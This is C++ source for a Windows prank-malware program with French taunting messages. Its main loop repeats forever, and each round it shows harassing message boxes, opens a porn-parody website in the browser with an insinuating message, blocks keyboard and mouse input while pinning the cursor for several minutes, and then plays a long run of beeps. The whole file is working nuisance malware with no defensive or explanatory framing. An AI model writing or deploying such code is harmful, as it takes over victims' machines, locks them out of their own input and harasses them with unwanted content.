#include <windows.h>
#include <fstream>

using namespace std;

int main() {
    void messageset();
    void pornpopup();
    void payload();

    int y = 1;
    while(y<10) {
        messageset();
        Sleep(60000);
        pornpopup();
        Sleep(60000);
        payload();
        Sleep(60000);
    }
}

void messageset() {
    if(MessageBox(
                NULL,
                "Je te vois uwu",
                "uwu",
                MB_OKCANCEL)==IDCANCEL) {
        MessageBox(
            NULL,
            "OH ! Essaie pas de me tej ou je te tej\nZBLAAAAAAAAAAAAAAAAAAA",
            "uwu",
            MB_OK);
    }
}

void pornpopup() {
    ShellExecute(NULL, TEXT("open"), TEXT("https://cornhub.website"), NULL, NULL, SW_SHOW);

    MessageBox(
        NULL,
        "Tu regardes quoi...? Hmm... Une p'tite video on dirait\nça va j'aime bien ce genre de video tu peux laisser",
        "uwu",
        MB_OK);
}



void payload() {
    int a = 1;

    while(a<100) {
        BlockInput(TRUE);
        SetCursorPos(500,500);
        Sleep(3000);
        a++;
    }

    Sleep(10000);
    int freq = 100;
    int loop = 1;
    while(loop<200) {
        Beep(freq,100);
        Sleep(50);
        freq++;
        loop++;
    }
}
